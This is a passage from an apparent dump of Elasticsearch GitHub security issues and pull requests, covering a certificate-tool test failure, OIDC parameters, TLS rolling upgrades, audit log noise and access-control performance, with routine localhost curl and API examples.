    at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
    at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
    at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:850)
    at java.lang.Thread.run(Thread.java:833)

    Caused by: java.io.IOException: getSecretKey failed: Password is not ASCII

      at sun.security.pkcs12.PKCS12KeyStore.getPBEKey(PKCS12KeyStore.java:874)
      at sun.security.pkcs12.PKCS12KeyStore.encryptPrivateKey(PKCS12KeyStore.java:935)
      at sun.security.pkcs12.PKCS12KeyStore.setKeyEntry(PKCS12KeyStore.java:631)
      at sun.security.pkcs12.PKCS12KeyStore.engineSetKeyEntry(PKCS12KeyStore.java:589)
      at sun.security.util.KeyStoreDelegator.engineSetKeyEntry(KeyStoreDelegator.java:112)
      at java.security.KeyStore.setKeyEntry(KeyStore.java:1195)
      at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateCommand.lambda$writePkcs12$4(CertificateTool.java:562)
      at org.elasticsearch.xpack.security.cli.CertificateTool.withPassword(CertificateTool.java:1036)
      at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateCommand.writePkcs12(CertificateTool.java:560)
      at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateAuthorityCommand.lambda$writeCertificateAuthority$1(CertificateTool.java:939)
      at org.elasticsearch.xpack.security.cli.CertificateTool.fullyWriteFile(CertificateTool.java:1096)
      at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateAuthorityCommand.writeCertificateAuthority(CertificateTool.java:937)
      at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateAuthorityCommand.execute(CertificateTool.java:928)
      at org.elasticsearch.xpack.security.cli.CertificateToolTests.testHandleLongPasswords(CertificateToolTests.java:425)
      at jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:104)
      at java.lang.reflect.Method.invoke(Method.java:577)
      at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
      at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
      at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
      at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
      at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
      at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:843)
      at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:490)
      at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
      at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
      at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
      at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
      at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
      at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
      at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
      at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
      at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
      at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
      at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
      at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:850)
      at java.lang.Thread.run(Thread.java:833)

      Caused by: java.security.spec.InvalidKeySpecException: Password is not ASCII

        at com.sun.crypto.provider.PBEKey.<init>(PBEKey.java:70)
        at com.sun.crypto.provider.PBEKeyFactory.engineGenerateSecret(PBEKeyFactory.java:219)
        at javax.crypto.SecretKeyFactory.generateSecret(SecretKeyFactory.java:340)
        at sun.security.pkcs12.PKCS12KeyStore.getPBEKey(PKCS12KeyStore.java:870)
        at sun.security.pkcs12.PKCS12KeyStore.encryptPrivateKey(PKCS12KeyStore.java:935)
        at sun.security.pkcs12.PKCS12KeyStore.setKeyEntry(PKCS12KeyStore.java:631)
        at sun.security.pkcs12.PKCS12KeyStore.engineSetKeyEntry(PKCS12KeyStore.java:589)
        at sun.security.util.KeyStoreDelegator.engineSetKeyEntry(KeyStoreDelegator.java:112)
        at java.security.KeyStore.setKeyEntry(KeyStore.java:1195)
        at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateCommand.lambda$writePkcs12$4(CertificateTool.java:562)
        at org.elasticsearch.xpack.security.cli.CertificateTool.withPassword(CertificateTool.java:1036)
        at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateCommand.writePkcs12(CertificateTool.java:560)
        at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateAuthorityCommand.lambda$writeCertificateAuthority$1(CertificateTool.java:939)
        at org.elasticsearch.xpack.security.cli.CertificateTool.fullyWriteFile(CertificateTool.java:1096)
        at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateAuthorityCommand.writeCertificateAuthority(CertificateTool.java:937)
        at org.elasticsearch.xpack.security.cli.CertificateTool$CertificateAuthorityCommand.execute(CertificateTool.java:928)
        at org.elasticsearch.xpack.security.cli.CertificateToolTests.testHandleLongPasswords(CertificateToolTests.java:425)
        at jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:104)
        at java.lang.reflect.Method.invoke(Method.java:577)
        at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1758)
        at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:946)
        at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:982)
        at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:996)
        at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
        at org.apache.lucene.tests.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:44)
        at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
        at org.apache.lucene.tests.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:45)
        at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
        at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
        at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
        at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
        at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:843)
        at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:490)
        at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:955)
        at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:840)
        at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:891)
        at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:902)
        at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
        at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
        at org.apache.lucene.tests.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:38)
        at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
        at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
        at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
        at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
        at org.apache.lucene.tests.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
        at org.apache.lucene.tests.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:43)
        at org.apache.lucene.tests.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:44)
        at org.apache.lucene.tests.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:60)
        at org.apache.lucene.tests.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:47)
        at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
        at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:390)
        at com.carrotsearch.randomizedtesting.ThreadLeakControl.lambda$forkTimeoutingTask$0(ThreadLeakControl.java:850)
        at java.lang.Thread.run(Thread.java:833)

```","Pinging @elastic/es-security (Team:Security)",no,">test-failure,:Security/Security,Team:Security,"
elastic/elasticsearch,798669154,"Allow setting authentication request parameters in OIDC realm","[OIDC core specifies a number of optional parameters](https://openid.net/specs/openid-connect-core-1_0.html#AuthRequest) that can be set in an authentication request by an RP. We should evaluate those and support for specifying some/all with admin controlled values in order to satisfy various use cases. 

An example is allowing to set `prompt=login` that would have similar effect as setting `force_authn` to true in a SAML authentication request","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,1138345537,"Additional information on the security auto-configuration banner","This issue serves as a reference for ideas/suggestions on information that we can add to the security banner that we print on startup. These have come from internal discussions, users suggestions or users questions.

It's worth keeping in mind that we should be striving to strike a balance between brevity and usefulness, if we add too much information then we reduce the chances that users actually _read_ what we print out. 


- [ ] Print a curl example on how to connect to the node, such as `curl --cacert config/certs/http_ca.crt https://localhost:9200 -u elastic`
- [ ] Notify the user about the location of the HTTP CA certificate (`$ES_CONF/certs/http_ca.crt`)
- [ ] Print a link to the docs. This can be a specific page in the docs or simply point to the existing docs that we have","Pinging @elastic/es-security (Team:Security)",no,">enhancement,Team:Security,:Security/AutoConfiguration,"
elastic/elasticsearch,1343122433,"Add cert start/expiry dates to SSL Diagnostic msg","Updates the failure description returned by `SslDiagnostics`
to include the `notBefore` and `notAfter` dates of the leaf
certificate.
","Pinging @elastic/es-security (Team:Security)Hi @tvernum, I've created a changelog YAML for you.Hi @tvernum, would it be helpful to include PrivateKeyUsagePeriod dates too, if that extension is present in the leaf cert? I don't think Elasticsearch certutil adds a PKUP extension, but organizations may issue TLS server certs (or clients) with that extension.

My understanding is the dates in the TBSCertificate apply to both the public key and private key. However, if the PKUP extension is present, the TBSCertificate dates only apply to the public key. I think PKUP is a way to enforce shorter private key times, to encourage more frequent rotation of key pairs. In other words, a private key may be used for X months for signing, and the public key can be used for Y years for verification.

Do you think customers deploy Elasticsearch with custom certs containing PKUP extension?Potentially, we could also wait for feedback to see if it is worthwhile to add PKUP dates to the diagnostic in a future PR.",yes,">enhancement,:Security/TLS,Team:Security,v8.6.0,"
elastic/elasticsearch,605039471,"Revisit the default cost for password hashing","The current defaults are 
- cost factor of 10 for `bcrypt`
- `10000` iterations for `PBKDF2`

see https://github.com/elastic/elasticsearch/pull/55544#issuecomment-617494220 also ","Pinging @elastic/es-security (:Security/Authentication)Pinging @elastic/es-security (Team:Security)",no,":Security/Authentication,Team:Security,v8.6.0,"
elastic/elasticsearch,415772924,"Support rolling upgrades to enable security","# Support rolling upgrades to enable security

Currently it is impossible to upgrade a non-secured cluster to a secured cluster due to the need to enable TLS. We would like to enable a way for cluster nodes to speak both TLS and plaintext during a rolling restart.

## Requirements

- [ ] Add dynamic `xpack.security.transport.ssl.dual_stack.enabled` setting to allow TLS nodes to open and accept plaintext connections (#39532)
- [ ] Modify PKI Realm to handle scenario where connection does not have `SSLEngine` (#39532)
- [ ] Netty transport support accepting plaintext connections when `dual_stack` enabled (#39532)
- [ ] Nio transport support accepting plaintext connections when `dual_stack` enabled
- [ ] Netty transport support opening plaintext connections when `dual_stack` enabled
- [ ] Nio transport support opening plaintext connections when `dual_stack` enabled
- [ ] Close plaintext connections when `dual_stack` setting is updated to disabled
	* #39532 handles this for connections accepted by the netty transport.
- [ ] Add rolling upgrade test for a cluster upgrading from no TLS to TLS enabled

## Considerations

- [ ] Should we accept `http` connections?
- [ ] Some level of user feedback/warning if `dual_stack` is accidentally left enabled?
	* We could consider some type of functionality where we stop allowing plaintext connections after some period of time.
- [ ] Is there a potential race for disabling `dual_stack` (requires propagating settings through nodes) and plaintext connections being closed? This should not be a common scenario because you should normally only be disabling this setting once all nodes have security enabled.
	* We should maybe consider adding a UI to support this.","Pinging @elastic/es-securityVery useful enhancement. @tbrooks8 , so except SSL, update xpack.security.enabled config also needs full cluster restart? Do we have plan to enhance this part?Seems like #39532 has been closed, I understand this will not be done. Has then this enhancement been discarded as well?It is very unlikely that we will continue with this approach, but we have not entirely abandoned the idea of rolling upgrades to security.Pinging @elastic/es-security (Team:Security)",no,">enhancement,Meta,:Security/TLS,Team:Security,v8.6.0,"
elastic/elasticsearch,1223515301,"Single mapping name for system indices","### Context
In 7.17, we assert that the incoming mappings for index creation has a single out key of `_doc` (the default single mapping name):
https://github.com/elastic/elasticsearch/blob/5ad023604c8d7416c9eb6c0eadb62b14e766caff/server/src/main/java/org/elasticsearch/cluster/metadata/MetadataCreateIndexService.java#L843-L844

But this is _not_ always true when security indices are created in a mixed cluster (8.x and 7.17) because the mappings are configured _without_ the single-mapping-name in 8.x:
https://github.com/elastic/elasticsearch/blob/d20b9dff8db164ce09cfa4d9ac2c1f8f7684bd76/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/support/SecurityIndexManager.java#L393

while they are configured *with* the single-mapping-name in 7.17:
https://github.com/elastic/elasticsearch/blob/5ad023604c8d7416c9eb6c0eadb62b14e766caff/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/support/SecurityIndexManager.java#L383

Therefore, if the request hits a 8.x node first, the assertion will be tripped in the 7.17 node (if 7.17 is the master node). Till today, we didn't have any tests that create a net new security index in 8.x node of a mixed cluster. So the assertions are never tripped. It does _not_ seem to be a problem in production because: (1) assertions are not fired in production; (2) MapperService handles the mappings with or without the single-mapping-type in 7.17:
https://github.com/elastic/elasticsearch/blob/5ad023604c8d7416c9eb6c0eadb62b14e766caff/server/src/main/java/org/elasticsearch/index/mapper/MappingParser.java#L186-L190

Though the above is for security indices, it seems that all system indices can have similar issue:
https://github.com/elastic/elasticsearch/blob/d20b9dff8db164ce09cfa4d9ac2c1f8f7684bd76/server/src/main/java/org/elasticsearch/action/admin/indices/create/TransportCreateIndexAction.java#L199
https://github.com/elastic/elasticsearch/blob/d20b9dff8db164ce09cfa4d9ac2c1f8f7684bd76/server/src/main/java/org/elasticsearch/action/admin/indices/create/AutoCreateAction.java#L334

### Steps to reproduce:
1. Start a 7.17 node with `-ea` to enable assertions
2. Start a 8.x node to form a cluster with the above 7.17 node. Make sure 7.17 is the master
3. Create a user on the 8.x node to trigger creation of the security index:
```
PUT _security/user/foo
{""password"":""password"",""roles"":[""foo-role""]}
```
4. The 7.17 node crashes with AssertionError

### Question
Is simply dropping the assertions in 7.17 the right fix?

It seems to be. However, I am not entirely sure whether the underlying system is fully ready for handling mappings that do not have the single-mapping-name key. It appears to be working fine. In fact, the code is out there for a while and I am not aware of any related bug report. So it most likely works. But I'd appreciate confirmation from people who are more expert for system indices and mapping services.","Pinging @elastic/es-core-infra (Team:Core/Infra)Pinging @elastic/es-security (Team:Security)I can't speak to the mapping services side, but there is a System Indices mechanism for making sure mappings are compatible with the minimum node version in the cluster... and we haven't used it. It was definitely an oversight.

Every SystemIndexDescriptor can hold a list of ""prior descriptors"" (we validate that descriptors on the ""prior"" list don't have their own prior descriptors). At index creation time, the index creation service will retrieve the descriptor that is compatible with the minimum node in the cluster. _If_ we'd implemented this for the security indices, I don't think we'd be seeing this problem, since even if the master node were the 8.x node, it would still retrieve a mapping that works for the 7.x node.

I think we could add a ""prior index descriptor"" as a bugfix, but the only model for this is in test code.",no,">bug,:Core/Infra/Core,:Security/Security,Team:Core/Infra,Team:Security,"
elastic/elasticsearch,501148841,"Reduce noise when issuing requests against an index pattern","<!--

** Please read the guidelines below. **

Issues that do not follow these guidelines are likely to be closed.

1.  GitHub is reserved for bug reports and feature requests. The best place to
    ask a general question is at the Elastic [forums](https://discuss.elastic.co).
    GitHub is not the place for general questions.

2.  Is this bug report or feature request for a supported OS? If not, it
    is likely to be closed.  See https://www.elastic.co/support/matrix#show_os

3.  Please fill out EITHER the feature request block or the bug report block
    below, and delete the other block.

-->

<!-- Feature request -->

**Describe the feature**:

Today, auditing will repeatedly list out all indices if a request targets an index pattern. For instances, given 5x single shard indices (`index-1`, `index-2`, etc), a search against `index-*` will generate the following log lines (ES `7.3.2`):

The request:
```
curl -u elastic -XGET ""http://localhost:9200/index-*/_search?size=0""
```
The result in `elasticsearch_audit.log`:
```
{""type"":""audit"", ""timestamp"":""2019-10-01T16:42:44,865-0400"", ""node.id"":""0s6Y8kjgQYeMgN4Sh9YwEA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:55019"", ""request.id"":""tUUDkBsCSf24OU1FTrU3tg"", ""action"":""indices:data/read/search"", ""request.name"":""SearchRequest"", ""indices"":[""index-1"",""index-2"",""index-3"",""index-4"",""index-5""]}
{""type"":""audit"", ""timestamp"":""2019-10-01T16:42:44,865-0400"", ""node.id"":""0s6Y8kjgQYeMgN4Sh9YwEA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:55019"", ""request.id"":""tUUDkBsCSf24OU1FTrU3tg"", ""action"":""indices:data/read/search[phase/query]"", ""request.name"":""ShardSearchTransportRequest"", ""indices"":[""index-1"",""index-2"",""index-3"",""index-4"",""index-5""]}
{""type"":""audit"", ""timestamp"":""2019-10-01T16:42:44,866-0400"", ""node.id"":""0s6Y8kjgQYeMgN4Sh9YwEA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:55019"", ""request.id"":""tUUDkBsCSf24OU1FTrU3tg"", ""action"":""indices:data/read/search[phase/query]"", ""request.name"":""ShardSearchTransportRequest"", ""indices"":[""index-1"",""index-2"",""index-3"",""index-4"",""index-5""]}
{""type"":""audit"", ""timestamp"":""2019-10-01T16:42:44,866-0400"", ""node.id"":""0s6Y8kjgQYeMgN4Sh9YwEA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:55019"", ""request.id"":""tUUDkBsCSf24OU1FTrU3tg"", ""action"":""indices:data/read/search[phase/query]"", ""request.name"":""ShardSearchTransportRequest"", ""indices"":[""index-1"",""index-2"",""index-3"",""index-4"",""index-5""]}
{""type"":""audit"", ""timestamp"":""2019-10-01T16:42:44,867-0400"", ""node.id"":""0s6Y8kjgQYeMgN4Sh9YwEA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:55019"", ""request.id"":""tUUDkBsCSf24OU1FTrU3tg"", ""action"":""indices:data/read/search[phase/query]"", ""request.name"":""ShardSearchTransportRequest"", ""indices"":[""index-1"",""index-2"",""index-3"",""index-4"",""index-5""]}
{""type"":""audit"", ""timestamp"":""2019-10-01T16:42:44,867-0400"", ""node.id"":""0s6Y8kjgQYeMgN4Sh9YwEA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:55019"", ""request.id"":""tUUDkBsCSf24OU1FTrU3tg"", ""action"":""indices:data/read/search[phase/query]"", ""request.name"":""ShardSearchTransportRequest"", ""indices"":[""index-1"",""index-2"",""index-3"",""index-4"",""index-5""]}
```

This can become problematic when the pattern is backed by hundreds of indices and shards. Log volume could be significantly reduced if we just logged the pattern that was targeted. For example:

```
{""type"":""audit"", ""timestamp"":""2019-10-01T16:42:44,867-0400"", ""node.id"":""0s6Y8kjgQYeMgN4Sh9YwEA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:55019"", ""request.id"":""tUUDkBsCSf24OU1FTrU3tg"", ""action"":""indices:data/read/search[phase/query]"", ""request.name"":""ShardSearchTransportRequest"", ""indices"":[""index-*""]}
```

Even better would be to do the above AND log the specific index + shard the line corresponds to.
","Pinging @elastic/es-security (:Security/Audit)I don't think we want to do this.
`index-*` will be resolved to whatever indices the user has access to that match that pattern, which may be a subset of the indices that exist.

So when reviewing the audit log, an index pattern of `""*""` could potentially refer to completely different indices for different users which is not a helpful property in an audit system.

I'd be happy for us to look at whether we're producing too many audit records (or too verbose audit records) when an action has multiple phases.
 What if the auditing mechanism captured both the original pattern (or alias) that was targeted + the respective index that's actually being searched?

```
{""type"":""audit"", ""timestamp"":""2019-10-01T16:42:44,867-0400"", ""node.id"":""0s6Y8kjgQYeMgN4Sh9YwEA"", ""event.type"":""transport"", ""event.action"":""access_granted"", ""user.name"":""elastic"", ""user.realm"":""reserved"", ""user.roles"":[""superuser""], ""origin.type"":""rest"", ""origin.address"":""[::1]:55019"", ""request.id"":""tUUDkBsCSf24OU1FTrU3tg"", ""action"":""indices:data/read/search[phase/query]"", ""request.name"":""ShardSearchTransportRequest"", ""target"":[""index-*""], ""index"":[""index-1""]}
```
Maybe not the best naming convention, but you'd be able to extrapolate what a given principal had access to:

* `""target"":[""index-*""]`
* `""index"":[""index-1""]`

If we need the best of both worlds, maybe auditing could log a single event on the coordinating node that shows the full pattern expansion, but shard level requests could use something similar to the above format?
> What if the auditing mechanism captured both the original pattern (or alias) that was targeted + the respective index that's actually being searched?

I will investigate this option. I understand that the coordinating node should list the complete concrete-index list, and the data node only list the actual index being searched. ",no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,317447413,"Audit Log: Index request_body, and store as text","*Original comment by @cwurm:*

Currently, if a user enables logging the `request_body` it is stored as a `keyword`, and not indexed. I believe it should be a `text` and indexed, so it can be searched.

I hit on this when trying to find the request Kibana had made to fill a dashboard with data, and found what I had assumed would be simple unexpectedly hard. There's many requests logged even on a simple setup (10 requests per second with plain Kibana is normal) just looking through the most recent ones often doesn't work well. Search would help.

Also, if I want to look at all instances of this dashboard being run I'd need to filter on request_body.

I think this would be in line with the expected use of turning on full request logging: Being able to quickly find specific queries is a vital part of that, e.g. when trying to determine how often a specific query was run, and by whom.","For my use case, I overrode the default index template by doing the following: https://gist.github.com/danielyahn/cd6548498f6d20a55ebff86ebf0fafcd

Also was able to make a dashboard!
https://medium.com/@danielyahn/elasticsearch-query-audit-dashboard-e37fe050b456 ",no,">enhancement,help wanted,:Security/Audit,Team:Security,"
elastic/elasticsearch,921133113,"Improve the license upgrade warning message","## Description

When a Basic cluster license is upgraded to Gold, the following message is returned by Elasticsearch:

```
{
  ""acknowledged"": false,
  ""license_status"": ""valid"",
  ""acknowledge"": {
    ""message"": ""This license update requires acknowledgement. To acknowledge the license,
                please read the following messages and update the license again,
                this time with the \""acknowledge=true\"" parameter:"",
    ""security"": [
      ""Field and document level access control will be disabled."",
      ""Custom realms will be ignored."",
      ""A custom authorization engine will be ignored.""
    ]
  }
}
```

The list contains Platinum features, and it's technically correct that they will not be enabled on a Gold cluster.
However, it's likely that users will be confused and think that they will lose access to those features.
This sounds like a complex way to promote Platinum, so I don't see a strong reason to keep the message as is.

## Proposal

Tune the message based on the current and new license, rather than just the new one.
So, if a Platinum cluster is downgraded to Gold, the message will be there, but if it's upgraded from Basic to Gold, it will not.

Similar checks should be done for Enterprise features.","Pinging @elastic/es-security (Team:Security)Removing `team-discuss` because we've agreed we should do this. There's currently some license refactoring work going on, and there's an intention to improve the way we handle these messages (technically) as part of that (or as a follow up). That is likely to provide an opportunity to fix these inconsistencies.",no,">enhancement,:Security/License,Team:Security,"
elastic/elasticsearch,317448175,"Delete by query should fail fast if user does not have permissions to delete","*Original comment by @nik9000:*

Reported here: https://discuss.elastic.co/t/delete-by-query-request-run-on-alias-needs-security-rights-to-index/102480

Reproduction looks sane but didn't test it myself.

I agree think we should fail delete by query against indices for which we don't have the delete privileges.","*Original comment by @nik9000:*

The trouble is that if the index is empty then the delete by query doesn't fail if the user can't delete.

I expect the same problems for reindex and update by query but I haven't seen a report of it.*Original comment by @jaymode:*

LINK REDACTED is the issue I opened that relates to the authorization of aliases and underlying indices.*Original comment by @nik9000:*

Thanks @jaymode !",no,">bug,:Security/Security,Team:Security,"
elastic/elasticsearch,317449486,"Fail on startup if unavailable ciphers are configured ","*Original comment by @tvernum:*

From LINK REDACTED

If the user has explicitly configured ciphers that are not available on their JDK, we should consider that to be an error and fail during configuration validation (or bootstrap checks).  
The current behaviour is to just log loudly.

The behaviour when using the default configuration should continue as is - pick the best available ciphers and log loudly if the recommended ciphers aren't available.
 

",,no,"v6.0.3,:Security/TLS,Team:Security,"
elastic/elasticsearch,1314595287,"Lazy compute the index access control","The access control was always computed eagerly, even in cases when 
it was not necessary (e.g. shard is not accessed on the node doing 
the authorization or in cases when authorization is denied). 
This commit defers the computation to when it's really needed and tries 
to avoid that the actual work is done on the network worker thread.
","This PR is still a draft as it depends on changes made in https://github.com/elastic/elasticsearch/pull/88662.The `elasticsearch-ci/part-2` build failure is caused by the same issue as reported in [[CI] CartesianShapeQueryTests testQueryRandomGeoCollection failing](https://github.com/elastic/elasticsearch/issues/88682).@elasticmachine run elasticsearch-ci/part-2Pinging @elastic/es-security (Team:Security)@elasticmachine update branch@elasticmachine update branchI stepped through an example with DLS and an example without DLS for a search request ...while i can see the new deferred/lazy loading, in both cases the supplier was realized/loaded as part of the SearchRequest task on the coordinating node (specifically in org.elasticsearch.xpack.security.authz.interceptor.FieldAndDocumentLevelSecurityRequestInterceptor#intercept and org.elasticsearch.xpack.security.authz.interceptor.DlsFlsLicenseRequestInterceptor#intercept) . I think this change only makes sense if deferring/lazy loading allow us to skip some expensive work or move the work to a better thread/context. 

As-is it seems that we are just delaying the same work till a bit later in the processing. (moving from authz code to request interceptors, but still on transport worker).  If I understand correctly, this information is is pertinent on the coordinating node for license and feature checks (fail fast), and pertinent on the shard level actions to find the dls/fls to apply. So I don't think we can skip the checks on the coordinating action nor or on the chlid actions (at least for search requests). 

--- (tangential) ---
Also, for my own education... part of this data structure the (now) lazy work contributes (org.elasticsearch.xpack.core.security.authz.accesscontrol.IndicesAccessControl.IndexAccessControl) determines access per index is granted or not ... do you know exactly how the granted information is used ? It appears to be tracked but I can't see how granted it is actually used (or how it could ever be false) as the requested index names have been replaced on the request object.



We discussed but I wanted to verify it myself. It's possible to NOT evaluate the access control on the coordinating node:

```
